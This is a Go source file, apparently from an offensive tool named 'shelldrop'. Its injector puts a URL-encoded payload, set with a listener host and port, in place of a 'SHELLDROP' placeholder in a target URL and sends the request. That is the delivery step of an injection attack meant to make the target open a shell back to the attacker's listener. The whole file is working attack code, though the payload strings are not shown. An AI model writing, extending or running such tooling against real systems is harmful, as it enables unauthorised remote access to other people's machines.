package main

import (
	"context"
	"net/http"
	"shelldrop/log"
	"shelldrop/payloads"
	"strings"
	"time"
)

type (
	Injector struct {
		listenerConfig ListenerConfig
		method         string
		url            string
		payloadName    string
	}
)

func NewInjector(payloadName string) *Injector {
	return &Injector{
		method:      "GET",
		payloadName: payloadName,
	}
}

func (i *Injector) Do(ctx context.Context) error {
	log.Infof("Testing %s", i.payloadName)

	url := i.setPayload(i.url)

	req, err := http.NewRequestWithContext(ctx, i.method, url, nil)
	if err != nil {
		return err
	}

	client := &http.Client{
		Timeout: 3 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (i *Injector) WithListenerConfig(listenerConfig ListenerConfig) *Injector {
	i.listenerConfig = listenerConfig
	return i
}

func (i *Injector) WithUrl(url string) *Injector {
	i.url = url
	return i
}

func (i *Injector) setPayload(value string) string {
	payload := payloads.GetUrlEncoded(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	return strings.Replace(value, "SHELLDROP", payload, -1)
}
